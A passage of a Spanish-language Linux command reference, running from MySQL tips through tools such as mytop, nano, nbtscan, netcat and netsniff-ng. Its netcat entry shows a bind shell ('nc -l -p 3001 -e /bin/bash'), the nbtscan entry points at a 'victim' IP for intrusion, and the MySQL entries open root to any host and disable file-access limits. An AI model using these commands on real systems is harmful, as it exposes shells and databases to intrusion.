	mysql> SELECT * FROM usuarios WHERE profesion="portero" OR profesion="contable"; (filtrar porteros y contables)
	mysql> SELECT * FROM usuarios WHERE (profesion="portero" AND sexo="f")
	    -> OR (nombre = "juan" AND sexo = "m"); (Filtrar distintas opciones encerradas entre parentesis)
	mysql> SELECT apellido, nacimiento FROM usuarios;
	mysql> SELECT antiguedad FROM usuarios; (Filtrar la columna "antiguedad")
	mysql> SELECT nombre, nacimiento FROM usuarios ORDER BY nacimiento; (Ordenar por fecha nacimiento)
	mysql> SELECT * FROM la_tabla ORDER BY la_columna; (Ordenar por el número de una columna)
Incrementos en un campo:
	mysql> update instrumentos set precio=precio+10; (Incrementar todos los campos "precio" de la tabla "instrumentos" en 10)
	mysql> update instrumentos set precio=precio+10 where tipo=cuerda; (Solo incrementar en 10 el campo "precio" de la tabla "instrumentos" para los de "cuerda":)
	mysql> update instrumentos set precio=(precio+precio*0.20) where tipo='viento'; (Solo incrementar un 20% (0,2) el campo "precio" de la tabla "instrumentos" para los de "viento":)
	mysql> select nombre, precio, existencias*precio from instrumentos; (Ver de cada entrada (nombre) el precio unitario (precio) y el precio del total según las existencias:)
Otras operaciones:
	mysql> DELETE FROM usuarios WHERE nombre='Maria'; (Eliminar toda la entrada que contenga "Maria")
	mysql> DROP TABLE usuarios; (Eliminar una tabla)
	mysql> DROP TABLE IS EXIST usuarios; (Eliminar tabla si existe)
	mysql> CHECK TABLE la_tabla EXTENDED; (Chequear la integridad de una tabla)
	mysql> REPAIR TABLE la_tabla; (Reparar una tabla)
1.-
En ciertos casos, para resolver el error: mysqldump: Got error: xxxx: Table 'xxxxxxxxx' doesn't exist when using LOCK TABLES:
$ mysqldump -u root -p BDs --single-transaction > dump.sql
2.-
Otro sistema para importar una base de datos. Primero crearla, entrar en ella y ejecutar el source sobre el fichero sql:
	mysql> CREATE DATABASE datos;
	mysql> USE datos;
	mysql> SOURCE datos.sql;
3.-
Exportar una tabla a txt con determinado formato:
	mysql> SELECT * FROM tabla INTO OUTFILE "tabla.txt"
	   --> FIELDS TERMINATED BY '   '
	   --> LINES TERMINATED BY '\n\n\r';
FIELDS TERMINATED BY '  ' (indica que los campos de cada línea terminarán con dos espacios.
LINES TERMINATED BY '\n\n\r '(indica el carácter como acaba cada linea, en este caso dos saltos de línea y retorno de carro
otras instrucciones de formato:
ENCLOSED BY '"' (Que los campos de tipo char, text, binary y enum de cada línea se entrecomillan)
IGNORE 1 LINES (No cargar la primera línea del fichero de texto)
LINES STARTING BY '---' (Que todas las líneas empiezen con "---".
4.-
Ejemplo parecido al anterior pero ordenando el fichero por el segundo campo:
	mysql> SELECTC campo1,campo2,campo3 FROM tabla ORDER BY campo2 INTO OUTFILE "campos.txt"
	--> FIELDS TERMINATED BY ' '
	--> LINES TERMINATED BY '\n\r';
5.-
Gestion de usuarios.
Cuando creamos un nuevo usuario en MySQL, éste queda identificado por su nombre de usuario más el nombre o IP del ordenador desde el cual hemos dicho que accederá (el carácter comodín '%' representa varios ordenadores).
Ejemplos:
     juan
     juan@'%'
     juan@localhost
     juan@'192.168.1.%'
     juan@'%.dominio.org'
Operaciones con usuarios:
	mysql> SELECT User,Host,Password FROM mysql.user; (Ver los usuarios)
	mysql> CREATE USER juan@'%' IDENTIFIED BY '1234'; (Crear un usuario con la contraseña 1234)
	mysql> CREATE USER john IDENTIFIED BY '1234', peter IDENTIFIED BY '4321'; (Crear dos usuarios)
	mysql> RENAME USER john TO juan, peter TO pedro;
	mysql> DROP USER juan, pedro; (Borrar dos usuarios)
	mysql> SET PASSWORD FOR juan = PASSWORD('abcde') (Cambiar la contraseña de un usuario)
	mysql> SHOW GRANTS FOR pedro; (Ver los privilegios de un usuario)
	mysql> GRANT ALL ON *.* TO juan@localhost (Otorgar todos los privilegios a un usuario)
	mysql> REVOKE ALL ON *.* FROM juan@localhost; (Anular todos los privilegios de un usuario)
6.-
Acceso remoto a mysql con el usuario root:
# nano /etc/mysql/my.cnf
Comentar la linea:
	#bind-address           = 127.0.0.1
Reiniciar el servicio:
# /etc/init.d/mysql restart
Entrar en el prompt de mysql y otorgar privilegios:
# mysql -u root -p
Entrar la contraseña y:
	mysql> GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'la_contraseña' WITH GRANT OPTION;
	mysql> FLUSH PRIVILEGES;
	mysql> exit
7.-
Solucionar:ERROR 1045 (28000): Access denied for user 'root'@'localhost' (using password: NO)
# /etc/init.d/mysql stop (Detener el servicio)
# mysqld_safe --user=mysql --skip-grant-tables (Saltar privilegios de MySQL)
$ mysql (En otra terminal entrar en MySQL)
	mysql> use mysql (Enrar en la BDs mysql)
	mysql> UPDATE user SET Password=PASSWORD('12345') WHERE user='root';(Actualizar el campo Password del usuario root)
	mysql> exit (Salir)
$ mysql -u root -p (Entrar en MySQL)
8.-
Solucionar error: ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv option so it cannot execute this statement
# nano /etc/mysql/my.cnf
Y en el apartado mysqld añadir la linea:
	secure-file-priv = ""
9.-
Modificar el promt de mysql
Si solo se desea modificar para la presente sesión, puede hacerse directamente desde el prompt de mysql:
	mysql> prompt \h [\d]>\_
	PROMPT set to '\h [\d]> '
	localhost [(none)]>
Para hacerlo permanente:
# nano /etc/mysql/my.cnf
Y en la sección [mysql] añadimos:
	prompt=\h [\d]>\_
Variables genéricas:
    \S muestra un punto y coma
    \' muestra comillas simples
    \" muestra comillas dobles
    \v muestra la versión del servidor
    \p muestra el puerto de conexión
    \\ Muestra una barra invertida
    \n Inserta un salto de linea
    \t Inserta una fabulación
    \ Inserta un espacio (debe haber un espacio en blanco después de \ )
    \_ Inserta un espacio (debe haber un _ después de \ )
    \d Muestra la base de datos por defecto
    \h Muestra el nombre del servidor
    \c Muestra un contador de sentencias ejecutadas. Continua aumentando a medida que introducimos comandos.
    \u Muestra el usuario
    \U Muestra el nombre de la cuenta de usuario en el formato usuario@servidor
10.-
Solucionar error: ERROR 1290 (HY000): The MariaDB server is running with the --skip-grant-tables option so it cannot execute this statement
mysql> flush privileges;
11.-
Colocar un contador de registros en una tabla. Incluir las lineas id_image... y PRIMARY KEY...:
    mysql> CREATE TABLE usuarios(
	-> id_image INT(3) NOT NULL AUTO_INCREMENT,
    -> nombre VARCHAR(20), apellido VARCHAR(20),
    -> profesión VARCHAR(20), sexo CHAR(1), nacimiento DATE,
    -> antiguedad DATE),
	-> PRIMARY KEY (id_image)
	-> );
12.-
Aumentar la seguridad de un servidor mysql
# nano /etc/mysql/my.cnf
Y modificar las siguientes lineas dejándolas:
	bind-address=127.0.0.1
	[mysqld]
	local-infile            = 0
	secure-file-priv        = /dev/null
	update mysql.user set user="USER" where user="root";
	flush privileges;
La primera linea indica que el servidor MySQL solo reciba conexiones de localhost. Las tres siguientes evitan la lactura de los ficheros de configuración. Las dos siguientes renombran al usuario root con el nombre que digamos, que colocaremos donde poner "USER"
Tambien es interesante realizar consultas para ver los privilegios de los usuarios y sus permisos dentro del prom de mysql:
	> select distinct(grantee) from information_schema.user_privileges;
Si solo queramos ver los permisos de un usuario:
	> show grants for 'root'@'localhost';
Otra herramienta importante es el script "mysql_secure_installation", el cual nos ayuda a eliminar usuarios anónimos, establecer una contraseña al administrador, eliminar las bases de datos de pruebas, habilitar o deshabilitar el acceso remoto del usuario administrador, etc.
$ sudo mysql_secure_installation


mysqladmin
Cliente mysql para realizar operaciones administrativas.
$ mysqladmin -u root -p version (Conocer la versión instalada)
$ mysqladmin -u root password 1234 (Establecer un primera contraseña si no la establece al instalar)
$ mysqladmin -u root -p1234 password 'abcd'(Cambiar la contraseña 1234 por abcd)
$ mysqladmin -u root -p create BASE_DATOS (Crear una base de datos)
$ mysqladmin -u root -p drop BASE_DATOS (Borrar una base de datos)
$ mysqladmin -u root -p status (Mostrar conexiones del servidor mysql)
$ mysqladmin -u root -p reload (Recargar privilegios)
$ mysqladmin -u root -p flush-logs (Vuelca todos los logs)
$ mysqladmin -u root -p flush-tables (Vuelca todas las tablas)
$ mysqladmin -u root -p shutdown (Para el servidor de forma segura)
$ mysqladmin -u root -p ping (Readlizar un ping al servidor mysql)


mysqlreport
Crea un informe de importantes valores del estado de MySQL. Interpreta y formatea los valores y presenta los valores básicos y muchos más valores inferidos en un formato legible por humanos.
# mysqlreport --user root (del usuario root)
# mysqlreport --outfile archivo (vuelca los datos en "archivo")


mysql_secure_installation
Mejorar la seguridad de la instalación de MariaDB. Este programa permite establecer contraseña para las cuentas,  puede eliminar el acceso remoto, eliminar cuentas anónimas y puede eliminar bases de datos de prueba, a las que los usuarios anónimos pueden acceder de forma predeterminada.
$ mysql_secure_installation


mysqlshow
Mstrar información de la base de datos, tablas y columnas.
# mysqlshow
# mysqlshow --count (Muestra el número de filas por tabla)
# mysqlshow --debug-info (Muestra información de la memoria y las estadísticas de uso de la CPU)


mysqltuner
Optimiza el sistema para que el motor de las bases de datos (mysql o mariadb) sean más rápidos. En primer lugar preparamos el contexto creando el directorio y descargando el script y archivos necesarios:
$ mkdir mysqltuner
$ cd mysqltuner
$ wget http://mysqltuner.pl/ -O mysqltuner.pl
$ wget https://raw.githubusercontent.com/major/MySQLTuner-perl/master/basic_passwords.txt -O basic_passwords.txt
$ wget https://raw.githubusercontent.com/major/MySQLTuner-perl/master/vulnerabilities.csv -O vulnerabilities.csv
	$ ls
	basic_passwords.txt  mysqltuner.pl  vulnerabilities.csv
Otorgamos permisos de ejecución al script de perl:
$ chmod +x mysqltuner.pl
Ejecutamos:
# ./mysqltuner
Nos pedirá nombre de usuario mysql o de mariadb y contraseña y mostrará el informe.


mytop
Monitorización del servidor de bases de datos mysql. "q" para salir. Comprobar la actividad ingresando en otra consola en mysql [mysql -u USER -p]
$ mytop -u USER -p PASS -h localhost -P 3306 --color (Especificando host y puerto)
Para no poner la contraseña y que quede reflejada en el historial, es preferible entrar los datos en un archivo:
$ nano .mytop
Con los siguientes parámetros:
	user=USER
	pass=PASS
	host=localhost
	db=
	delay=3
	port=3306
	batchmode=0
	header=1
	color=1
	idle=1
Delay=3 (Refrescar informe cada 3 segundos)
batchmode=0 (Con valor 1 mostrará por pantalla todas las consultas una detrás de otra sin recargar la página. Si el valor es 0 cada vez que se refresque la página se borrarán las consultas anteriores)
header=1 (Valor 1 muestra la cabecera)
color=1 (en color)
idle=1 (que muestre los resultados de las consultas que están dormidas)
Conceptos que muestra la pantalla de mytop:
	Queries (Número tatal de consultas)
	qps (Media de consultas por segundo)
	qps now (Número de consultas por segundo desde la última vez que se descargaron resultados)
	Slow (Número de consultas lentas)
	Slow qps (Consultas lentas desde la última descarga de resultados)
	Se/In/Up/De (indica cual es el porcentaje de Select, Insert, Update o Delete que se ejecutan en el servidor)
	key efficiency (Porcentaje de consultas que están utilizado una clave/índice en la consulta)
	Bps in/out (Media de bytes por segundo entrantes a la base de datos y media de bytes por segundo salientes)
	Now in/out (Media de bytes entrantes y salientes por segundo desde que mytop ha refrescado la página)
Teclas interactivas:
	d (Mostrar solo datos de una base de datos)
	f (Mostrar información completa de una consulta)
	F (Desactivar todos los filtros)
	h (Mostrar solamente los datos de un servidor específico)
	H (Mostrar/ocultar cabecera)
	i (Mostrar/ocultar consultar dormidas)
	k (Matar una consulta)
	p (Pausar la vista)
	m (Cambiar "consultas más lentas" a "consultas por segundo")
	o (Invertir orden)
	q (Salir)
	r (Resetear todos los valores)
	s (Cambiar el tiempo de refresco)
	t (Cambiar al modo vista)
	u (Mostrar solamente de un usuario específico)


namecheck
Consulta nombres de proyectos que no esten tomados. Cada nuevo proyecto requiere un nombre y estos han de ser únicos. Proponer nombres es difícil para asegurarse que no esten ya en uso y esta herramienta contiene una lista de sitios y patrones para evaluar.
$ namecheck tqñas-up84
	Testing tqñas-up84.tuxfamily.org - Available
	Testing    alioth.debian.org - Available
	Testing        launchpad.net - Available
	Testing     savannah.gnu.org - Available
	Testing      sourceforge.net - Available
	Testing        www.ohloh.net - Available
	Testing  projects.apache.org - Available
	The name 'tqñas-up84' doesn't appear to be in use.


namei
Mostrar la ruta desde el directorio raiz hasta donde especifiquemos.
$ namei $(pwd) (hasta el presente directorio)
$ namei -m $(pwd)/archivo (mostrando permisos y propietarios)


nameif
Modificar la MAC de una tarjeta de red dañada. Imaginemos el caso de un pc con dos tarjetas (eth0 y eth1) en el que la eth0 se estropea, con nameif podemos cambiar de interfaz la eth1 para ser la eth0:
# ifconfig eth1 (Averiguar la MAC de la eth1)
eth1      Link encap:Ethernet  HWaddr 00:23:54:57:fc:78
# ifconfig eth1 down (bajar la red eth1)
# nano /etc/init.d/networking
Añadir a continuación de la linea del PATH:
PATH="/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin"
nameif eth0 00:23:54:57:fc:78
....
Reiniciar el servicio:
# /etc/init.d/networking restart
Comprobar que eth1 se ha convertido en eth0:
# ifconfig eth0
eth0      Link encap:Ethernet  HWaddr 00:23:54:57:fc:78


nano
editor de texto.
$ nano -wx texto (Abrir "texto" inhabilitando "final de linea" [wrap] y la ayuda [x])
Nota.- "wrap" es la cantidad de caracteres de una linea y puede especificarse en los parámetros de nano.
Archivo de configuración. Crear:
$ touch .nanorc
Algunos parámetros a incluir:
set backup (Guarde copias con la extensión ~)
set const  (Muestra el número de lineas)
set casesensitive (distinguir mayúsculas y minúsculas en las búsquedas)
set smooth (Desplazamiento suave. Sin salto de media página)
set mouse (Habilita el uso del mouse. Precisa paquete gpm)
set tabsize 4 (Número de espacios en la tabulación. Por defecto 8)
set tabstospaces (convierte tabulaciones en espacios)
set nohelp (inhabilitar la ayuda de forma permanente)
set fill 60 (Número se caracteres por linea[wrap])
Atajos
	Ctrl + g (Menú ayuda)
	Ctrl + j (Justificar el párrafo actual)
	Ctrl + k (Cortar y guardar la línea actual)
	Ctrl + m (Insertar un retorno de carro)
	Ctrl + o (Escribir el fichero actual a disco)
	Ctrl + v (Moverse hacia el final del documento)
	Ctrl + w (Buscar una palabra en el texto)
	[Ctrl + w] + [Ctrl + r] (Buscar palabra y reemplazarla por otra)
	Ctrl + y (Moverse hacia el principio del documento)
	Ctrl + x (Salir de nano)
	Ctrl + d (Muestra número de palabras, lineas y caracteres)
	Ctrl + A (Empezar a marcar text. Con las flechas completar el trozo)
        Alt + 6 (Copiar el trozo marcado con Ctrl + A)
	Ctrl + u (Pegar la linea copiada/cortada)
	Mayu + Insert (Insertar del portapapeles)
	Alt + m (Soporte para ratón habilitar/deshabilitar. Precisa paquete gpm)
	Alt + y (Coloreado de sintaxis habilitar/deshabilitar)
	Alt + x (Suprimir/añadir la ayuda del final de página)
1- Solución al problema:
	$ nano .bashrc
	Error reading /home/<username>/.nano_history: Permission denied
	Press Enter to continue starting nano.
# nano /etc/nanorc
Y comentar la entrada:
	#set historylog
2- Activar el coloreado de sintaxis para los lenguajes de programación:
$ nano ~/.nanorc
Y colocar la linea:
  include /usr/share/nano/*.nanorc


nanoid
Crea contraseñas.
$ nanoid -s 10 (de 10 letras mayúsculas y minúsculas)
$ nanoid -s 15 -a .,-rtadls:_ (de 15 aracteres usando los signos y letras especificados con -a)


nast
Detectar usuarios, inalámbricos o no, de una red local. Como herramienta de análisis, tiene muchas características como:  Crear lista de hosts LAN, Seguir secuencias TCP-DATA, Encontrar puertas de enlace a Internet LAN, Descubre nodos promiscuos, Restablece conexiones establecidas, Realizar escáner de puertos medio abiertos, Buscar tipos de enlaces, Capturar banners del demonio de los nodos LAN, Controlar respuestas arp para descubrir posibles suplantaciones ...
      # nast (de forma interactiva informa de paquetes recibidos y los descartados por el kernel)
      Packets Received: 		581690
      Packets Dropped by kernel:	0
# nast -m (los que estan en la misma LAN)
# nast -g (dónde hay un gateway)
# nast -S (especificando una ip y un puerto. Acepta rango de puertos 1-400 o varios separados por comas 20,22,23,50-70)
# nast -C any (sin utilizar ningún filtro)
# nast -c -B (comprueba si alguien está envenenando con arp)


nautilus
Navegador de archivos de gnome
$ nautilus -q  (salir de nautilus)
$ nautilus -c  (Realizar una serie rápida de pruebas de autoevaluación)
$ nautilus -g 1200x400 (arrancarlo con determinadas medidas)
Para abrir lugares especiales en nautilus, colocarse sobre el escritorio GNOME y pulsar Mayúscula+7. Se abrirá una ventana “abrir lugar” y, en ella, escribiremos:
	computer:///  (Mostrar unidades y SO)
	network:///   (los sitios de la Red.)
	fonts:///   (ver las tipografías instaladas.)
	burn:///   (abre ventana grabar CD/DVD.)
	themes:///   (temas disponibles de GNOME.)
nautilus terminal
	# add-apt-repository ppa:flozz/flozz
	# apt-get update && sudo apt-get install nautilus-terminal
	$ nautilus -q
Extensión de Nautilus que permite tener una consola incrustada, sincronizada con el explorador.
Ctrl + Shift + t   (mostrar)
Ctrl + Shift + h  (ocultar)
Añadir “NUEVA PESTAÑA” en la barra de nautilus
# nano /usr/share/nautilus/ui/nautilus-navigation-window-ui.xml
Y pegar en la sección toolbar:
	<toolitem name="New Tab" action="New Tab"/>
Reiniciar
Atajos
	Ctrl+A (Seleccionar todo)
	Ctrl+C (Copiar)
	Ctrl+H (Muestra archivos ocultos)
	Ctrl+N (Abre nueva pantalla)
	Ctrl+T (Abre una nueva pestaña)
	Ctrl+Alt+D (Mostrar escritorio)
	Ctrl+Shft+N (Crear nueva carpeta)
	Shft+F10 (Activa el menú contextual para el elemento activo)
	Alt+Enter (Mostrar propiedades del elemento activo)
	Alt+Flechas (Desplazarse entre carpetas)
	Alt+tab (Navegar entre ventanas/documentos activos)
	Alt+espacio (Abre el menú de la ventana actual)
	F2 (Renombrar carpeta)


nbsdgames
Juegos para la terminal. Colección de juegos textuales con IA, modo de 2 jugadores, tamaño de tablero flexible, color, compatibilidad con mouse, etc. Incluye los siguientes:  battleship, checkers, fifteen, fisher, jewels, memoblocks, miketron, mines, muncher, pipes, rabbithole, redsquare, reversi, sos y sudoku.


nbtscan
Para ver máquinas que compartan información en una red por medio del protocolo NetBIOS [windows utiliza este protocolo para sus comunicaciones] GNU/Linux, BSD, Solaris y Mac utiliza el servicio samba por lo cual también serán detectados sus recursos compartidos.
# nbtscan 192.168.0.0/24  (Obtener nombres de los PCs de nuestra red)
# nbtscan -v 192.168.0.0/24  (Obtener la tabla NetBIOS de cada uno de los PCs que encuentre)
# nbtscan -r 192.168.2.0/24  (Para escanear completamente toda la red)
# nbtscan -v -s : 192.168.2.0/24  (Lo mismo con información por columnas)
# nbtscan -r 192.168.2.1-64  (Escanear por un rango de ips)
# nbtscan -f listado   (Escanear a partir de un archivo de ips)
El archivo listado tendrá un formato:
192.168.2.3
192.168.2.6
192.168.2.11
...
# nbtstat -A Ip_victima  (si hay algun pc al que se pueda entrar)
Si muestra la entrada <20> será susceptible de intrusion.
	LOKO <00> UNIQUE Registered
	CHEPUDO <00> GROUP Registered
	LOKO <03> UNIQUE Registered
	LOKO <20> UNIQUE Registered
	CHEPUDO <1E> GROUP Registered


ncal
Calendario. Casi igual que la aplicación cal [ver]
$ ncal -C (con los dias encina los números. Por defecto al lado)
$ ncal -y 2018 -C (muestra todo el año especificado)
$ ncal -m 2 (muestra el segundo mes del año)
$ ncal -3 (muestra el anterior, el presente y el proximo)
$ ncal -A 2 (los proximos tres meses [0,1 y 2])
$ ncal -B 2 (los anteriores tres meses [2, 1 y 0])


ncdt
Muestra un árbol de directorios muy parecido al árbol estándar del comando tree[ver]. Imprime información resumida en lugar del tamaño de archivo especial del directorio e información sobre archivos mp3.
Es particularmente útil para indexar CDs.
$ ncdt -d -b (mostrar sólo los directorios e imprimir información de su tasa de bits)


ncdu
Muestra el espacio usado por los archivos y directorios del directorio actual. Como “du” pero mostrando graficos y color.
$ ncdu /home/usuario


ncmpcpp
Reproductor de música. Al ser del tipo cliente-servidor, Precisa mpd [ver] arrancado.
En el archivo de configuración, que tiene que crearse, sólo es necesario especificar el directorio de música:
$ nano .ncmpcpp/config
mpd_music_dir = "/home/usuario/Musica"
Algunas teclas de control:
	F1 (Ayuda)
	F2 (Lista de reproducción)
	F3 (Explorador)
	F4 (Busca en la base de datos)
	F5 (Libreria)
	F6 (Editor de listas de reproduccion)
	F7 (Editor de etiquetas)
	F8 (Outputs)
	F9 (Visualizador musical)
	F10 (Reloj)
	@ (Informacion del servidor mpd)
	s (Detiene la reproducción)
	p (Cambia la visualización)
	P (Pausa la reproducción)
	Backspace (Pone el tema desde inicio)
	< (Tema anterior)
	> (Tema siguiente)


ncurses-doc
Contiene una introducción a la escritura de programas con ncurses y una guía de los aspectos internos de la biblioteca ncurses. También incluye las páginas de manual de las bibliotecas. Colocar en el navegador la url /usr/share/doc/ncurses-doc/html/index.html


ncurses-examples
Contiene programas que demuestran las posibilidades de ncurses y prueban la biblioteca. Los ejemplos incluyen varios programas clásicos como solitario, batallas, reloj, ajedrez, las torres de Hanoi y muchos otros. Colocar en el navegador: file:///usr/lib/ncurses/examples/


ne
Editor. Admite caracteres UTF-8, varias columnas y resaltado de sintaxis. Utiliza combinaciones de teclas breves, intuitivas y fáciles de recordar y, al mismo tiempo, proporciona todas las funciones que debería tener un editor. Es totalmente configurable, lo que permite al usuario cambiar el contenido de los distintos menús, crear fácilmente pequeñas macros y cambiar fácilmente las combinaciones de teclas existentes, siendo al mismo tiempo un editor pequeño y rápido. F1 para abrir menús y Esc para cerrarlos
$ ne --read-only --utf8 file.txt (solo lectura y codificación utf8)


needrestart
Comprueba qué demonios deben reiniciarse después de las actualizaciones de alguna biblioteca como actualizaciones del kernel, actualizaciones pendientes de microcódigo para CPU Intel, reiniciosd necesarios de contenedores o basados en interpretes... Está inspirado en checkrestart del paquete debian-goodies [ver].
# needrestart


needrestart-session
Implementa una notificación de las sesiones de los usuarios sobre sus procesos obsoletos después de las actualizaciones del sistema.
# needrestart-session
Nota.- Lo más normal es que muestre una ventana diciendo: "None of your processes need to be restarted" o sea que "No es necesario reiniciar ninguno de sus procesos"


neo
Recrea el efecto de lluvia digital de "The Matrix". Secuencias de caracteres aleatorios que se desplazan sin cesar por la pantalla de la terminal.
$ neo (forma básica)
$ neo -c red -m "linux es un sistema genial" (las letras en rojo y creando un mensaje en el centro de la pantalla)


neofetch
Muestra información del sistema. Instalación:
	$ git clone https://github.com/dylanaraps/neofetch.git
	$ cd neofetch
	# make install
$ neofetch (Básico)
$ neofetch --colors 9 3 5 10 7 9 (Modificando colores)


nessus
Scaner de vulneradilidades
Descargar nessus de: http://www.nessus.org/download/
Registrarnos en:  http://www.nessus.org/plugins/?view=register-info
Entrar el código de activación recibido por correo:
# /opt/nessus/bin/nessus-fetch --register 218B-76A4-CB0F-072B-AEEA
# /opt/nessus/sbin/nessus-adduser (Entrar usuario y contraseña)
# /opt/nessus/sbin/nessusd (Arrancar el servicio)
Abrir navegador y entrar en la pantalla de login con:
https://127.0.0.1:8834


net-acct
Demonio que crea logs del uso de la red.
# cat /var/log/net-acct/net-acct.log


net-tools
Paquete que contiene herramientas importantes para controlar el subsistema de red del núcleo Linux. Incluye arp, ifconfig, netstat, rarp, nameif y route, además de utilidades relacionadas con tipos de hardware de red específicos como plipconfig, slattach, mii-tool y aspectos avanzados de configuración de IP: iptunnel, ipmaddr.


netcat
utilidad que se puede utilizar para practicamente cualquier cosa relacionada con el protocolo TCP/IP [navaja suiza]
Nota.- En algunas distros está ligeramente capado. Preferible bajarlo de http://netcat.sourceforge.net/download.php y compilarlo:
$ ./configure
$ make DFLAGS=" -DTELNET -DGAPING_SECURITY_HOLE"
# make install
$ nc -v -v -z 192.168.2.5 21 22 25 110 5900 (que se conecte a la IP, envie más información [-v por duplicado], que no envie ningún dato [-z] y que lo haga por los puertos mencionados [21,22,25,110,5900])
$ nc -l -p 3001 -e /bin/bash  (Que esté a la escucha [-l] en el puerto 3001 [-p] y que, cuando haya conexión, ejecute nuestra shell bash [-e ....])
$ nc IP_servidor 3001  (desde el cliente, conectamos con el servidor y todo lo que escribamos se enviará al bash del servidor y lo que nos responda aparecerá en nuestra pantallla. Para terminar la conexión CTROL-C)
$ telnet -l usuario IP_o_nombre_host 3001 (Otra forma de establecer la conexión.)
$ nc -l -p 3000 > archivo (Dejar el servidor listo para recibir un archivo)
$ nc IP_servidor 3000 < archivo  (enviar desde el cliente el archivo)
$ nc -zw2 www.nombre.com 80 && echo open  (comprobar si está abierto el puerto 80 de un host)
$ nc -l -p 10000 < pelicula.avi  (streaming de video-servidor)
$ nc IP_o_host 10000 | mplayer – (streaming de video-cliente)
$ nc -l -p 10000 < fichero.mp3  (streaming de  audio-servidor)
$ nc IP_o_host 10000 | madplay –  (streaming de audio-cliente)
$ nc -l -p http -c "cat index.html"  (servidor http)
$ echo “GET /” | nc www.google.com 80 > index.html  (copiar una página web)
$ nc -l -p 10000 -c "nc host 22" (Proxy. El trafico recibido en el puerto 10000 se redirige al 22 del host especificado)
$ nc towel.blinkenlights.nl 23  (visionar la guerra de las galaxias)
$ dd if=/dev/sda5 | nc -l -p 10000  (clonar un disco por red. En el servidor)
$ nc IP_o_host 10000 | dd of=sda5.img  (En el cliente)
$ nc -l -p 7777 > /dev/null  (Prueba de rendimiento entre dos máquinas. En el Servidor)
$ pv -r /dev/zero | nc IP_servidor 7777  (En el cliente)
opciones
-v -v	.-	mostrar máxima información
-z	.-	mostrar puertos a la escucha


netdiag
Colección de pequeñas herramientas para analizar el tráfico de red y la configuración de hosts remotos. Incluye los ejecutables: tcpblast, netload, trafshow, netwatch, statnet y tcpspray.


netdiscover
Buscar máquinas [activas o pasivas] conectados  a una red.
# netdiscover -i eth0
# netdiscover -r 192.168.1.0/24 -i eth1 (especificando rango de ips)


netfilter-persistent
[iptables-persistent] Ver este paquete.


nethogs
Visualiza procesos que están consumiendo más ancho de banda en el sistema
# nethogs   (uso básico. Por defecto el dispositivo es eth0)
# nethogs eth0 eth1 (especificando dos redes)
# nethogs -t eth1  (en modo traza y especificando red)
# nethogs -d 5 eth1 (Actualizando datos cada 5 segundos)
# nethogs -p (modo promiscuo. Segun documentación no recomendado)
Pulsando:
	m --> Se cambian las unidades de medida a KB/s, B/s y MB/s
	s --> Ordenar por los datos enviados
	r --> Ordenar por los datos recibidos
	q --> Salir


netload
[netdiag]. Muestra la carga en la interfaz de red sin usar la propia interfaz. netload simplemente accede a las estadísticas del kernel. El archivo $HOME/.netloadrc permite agregar cualquier cantidad de interfaces de red, modificar la configuración de alarma y las preferencias de correo electrónico.
# netload eth0 -t 2 (actualizando cada 2 segundos)


netmask
Determina el conjunto más pequeño de máscaras de red para especificar un rango de hosts. Programa útil si se trabaja con firewalls o enrutadores.
$ netmask -d -s -c localhost (máxima información, salida estandar y formato CIDR de salida)
Nota.- El sistema de direcciones IP tal como lo utilizamos actualmente [IPv4[, hace tiempo que está agotado. Todas las direcciones posibles [al menos 4.294.967.296] ya han sido asignadas. Hace unas décadas hubo que pensar en una solución para resolver el problema. CIDR ayuda a ampliar la cantidad de direcciones disponibles.


netpbm
Conjunto de herramientas para manipulación de imágenes que permiten convertir entre muchos formatos gráficos conocidos [gif, bmp, jpg...] a un formato interno, o bien del formato interno a los formatos conocidos. Los formatos internos que utiliza son .ppm [Portable Pixel Map] para imágenes en color, .pgm [Portable Gray Map] para imágenes en escala de grises, y .pbm [Portable Bit Map] para imágenes formadas por bits de blanco y negro. A veces estos formatos aparecen bajo la extensión general .pnm, que abarca a todos ellos. Incluye más de 200  aplicaciones, tales como: jpegtopnm , pnmtojpeg , bmptoppm [man netpbm para un listado detallado],  muchos de estos formatos estan practicamente en desuso.
$ pbmtoascii -2x4 imagen.pbm  (convertir .pbm a ascii. Para mayor resolución -1x2)


netperf
Medir el rendimiento de la red. Ha de instalarse en el cliente y en el servidor. Utiliza el puerto 12865.
# nmap -O -p 12865 localhost | grep tcp (comprobar si el puerto esta abierto)
12965/tcp closed unknown
# nmap localhost -p 12865 | grep tcp   (abrir el puerto)
2865/tcp open  unknown
# netperf -H localhost


netplug
Demonio que monitorea el estado del enlace de las tarjetas de red y configura la red en eventos de conexión y desconexión. Es similar a ifplugd, pero usa NETLINK en lugar de sondear regularmente el estado del enlace. Esto mejora el consumo de energía con las computadoras portátiles, pero no funciona con todas las tarjetas.


netproc
monitorea el tráfico de la red e intenta averiguar a qué proceso pertenece este tráfico; esto es útil para identificar los procesos que consumen recursos de la red y solucionar problemas.
# netproc -i enp1s0 (forma básica especificando la interfaz. Por defecto todas)
# netproc -p tcp -c -f "netproc.txt" (visualizar cada acción activa del proceso tcp y guardar datos en el archivo especificado en el directorio actual)


netr
Monitor de interfaz de red simple que muestra estadísticas de tráfico
$ netr


netrik
Navegador WWW avanzado en modo texto. Su propósito es dar acceso a la mayor cantidad de Web posible en modo texto, sin renunciar a ninguna comodidad. La interfaz de usuario se parece más o menos a una combinación de gVim y PINE. El problema actual [2020] es que netrik no admite HTTPS ni IPv6 todavía.


netselect
Probar la velocidad de los servidores de red para elegir el más rápido. Puede procesar una lista de servidores y elegir el más rápido/más cercano automáticamente.
# netselect -vv -t 20 http://deb.debian.org/debian/ (más cantidad de información [-v, -vv, -vvv] y probando 20 paquetes de envio [por defecto 10])
# netselect -vv -s 5 http.us.debian.or (que muestre los 3 mejores servidores y el del final sea el mejor)


netsniff-ng
Es un sniffer de red de alto rendimiento para la inspección de paquetes. Se puede usar para análisis de protocolo, ingeniería inversa o red de depuración. El kit de herramientas netsniff-ng actualmente consta de las siguientes utilidades:
  - netsniff-ng - analizador de paquetes de zero-copy. Herramienta de captura/reproducción pcap
  - trafgen - generador de paquetes de red multiproceso de bajo nivel y zero-copy
  - mausezahn - generador de paquetes de alto nivel para dispositivos con Cisco-CLI
  - ifpps - herramienta de estadísticas de sistema y redes de kernel de primer nivel
  - curvetun - túnel IP multiusuario ligero basado en la curva25519
  - Astraceroute - ruta de seguimiento del sistema autónomo y utilidad de prueba DPI
